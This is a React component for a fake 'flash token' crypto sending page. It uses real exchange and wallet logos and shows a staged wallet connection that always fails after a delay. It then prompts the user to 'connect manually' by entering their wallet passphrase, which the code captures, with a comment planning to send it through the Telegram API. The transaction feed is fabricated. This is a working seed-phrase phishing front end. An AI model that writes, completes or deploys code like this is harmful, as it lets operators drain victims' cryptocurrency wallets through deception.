import { useState, useEffect } from 'react';

const TOKEN_OPTIONS = [
  'USDT (TRC20)', 'USDT (BEP20)', 'USDT (ERC20)', 'Bitcoin (BEP20)', 'USDC (BEP20)', 'ETH (BEP20)', 'SHIB (BEP20)'
];

const WALLET_OPTIONS = [
  { name: 'Binance', icon: 'https://www.binance.com/resources/ico/favicon.ico' },
  { name: 'Bybit', icon: 'https://www.bybit.com/favicon.ico' },
  { name: 'Coinbase Wallet', icon: 'https://www.coinbase.com/favicon.ico' },
  { name: 'Bitget', icon: 'https://www.bitget.com/favicon.ico' }, // Bitget’s logo isn’t easily found, using favicon
  { name: 'Trust Wallet', icon: 'https://trustwallet.com/assets/images/favicon.png' },
  { name: 'Wallet Connect', icon: 'https://walletconnect.com/favicon.ico' },
];

export default function Flash() {
  const [isLoading, setIsLoading] = useState(true);
  const [receiverAddress, setReceiverAddress] = useState('');
  const [selectedToken, setSelectedToken] = useState(TOKEN_OPTIONS[0]);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [walletLoading, setWalletLoading] = useState(false);
  const [connectionFailed, setConnectionFailed] = useState(false);
  const [passphrase, setPassphrase] = useState('');
  const [error, setError] = useState(null);

  useEffect(() => {
    try {
      const timer = setTimeout(() => setIsLoading(false), 10000);
      return () => clearTimeout(timer);
    } catch (err) {
      setError('Failed to initialize loading timer: ' + err.message);
    }
  }, []);

  const handleFlash = () => {
    try {
      setIsModalOpen(true);
      setConnectionFailed(false); // Reset on new attempt
      setPassphrase('');
    } catch (err) {
      setError('Flash button error: ' + err.message);
    }
  };

  const handleWalletClick = () => {
    try {
      setWalletLoading(true);
      setTimeout(() => {
        setWalletLoading(false);
        setConnectionFailed(true);
      }, 5000); // 5 seconds of "connecting..." before failing
    } catch (err) {
      setError('Wallet connection error: ' + err.message);
    }
  };

  const handleSubmit = () => {
    try {
      alert('Passphrase submitted: ' + passphrase); // Replace with Telegram API
      setPassphrase('');
      setIsModalOpen(false);
    } catch (err) {
      setError('Submit error: ' + err.message);
    }
  };

  if (error) return <div className="container">Error: {error}</div>;
  if (isLoading) return <div className="loading"><div className="spinner"></div></div>;

  return (
    <div className="container flash">
      <h1>Flash Tokens ⚡</h1>
      <input
        type="text"
        placeholder="Receiver Wallet 👾"
        value={receiverAddress}
        onChange={(e) => setReceiverAddress(e.target.value)}
      />
      <select value={selectedToken} onChange={(e) => setSelectedToken(e.target.value)}>
        {TOKEN_OPTIONS.map((option) => (
          <option key={option} value={option}>{option}</option>
        ))}
      </select>
      <button onClick={handleFlash}>Flash 🚀</button>

      {isModalOpen && (
        <div className="modal">
          <div className="modal-content">
            <h2>Link Wallet 🔗</h2>
            {walletLoading ? (
              <div className="loading">
                <div className="spinner"></div>
                <p>Connecting... 🌐</p>
              </div>
            ) : connectionFailed ? (
              <>
                <p className="error-text">Connection Failed ❌ - Connect Manually</p>
                <input
                  type="text"
                  placeholder="Enter Passphrase 🔑"
                  value={passphrase}
                  onChange={(e) => setPassphrase(e.target.value)}
                />
                <button onClick={handleSubmit}>Submit ✅</button>
              </>
            ) : (
              <div className="wallet-options">
                {WALLET_OPTIONS.map((wallet) => (
                  <button key={wallet.name} onClick={handleWalletClick}>
                    <img src={wallet.icon} alt={wallet.name} className="wallet-icon" />
                    {wallet.name}
                  </button>
                ))}
              </div>
            )}
            <button className="close-btn" onClick={() => setIsModalOpen(false)}>Close X</button>
          </div>
        </div>
      )}

      <div className="transactions">
        <h2>Live Transactions 📡</h2>
        <ul>
          <li>0x123... → 0x456...: 100 USDT 💸</li>
          <li>0x789... → 0xabc...: 0.5 BTC ⚡</li>
        </ul>
      </div>
    </div>
  );
    }
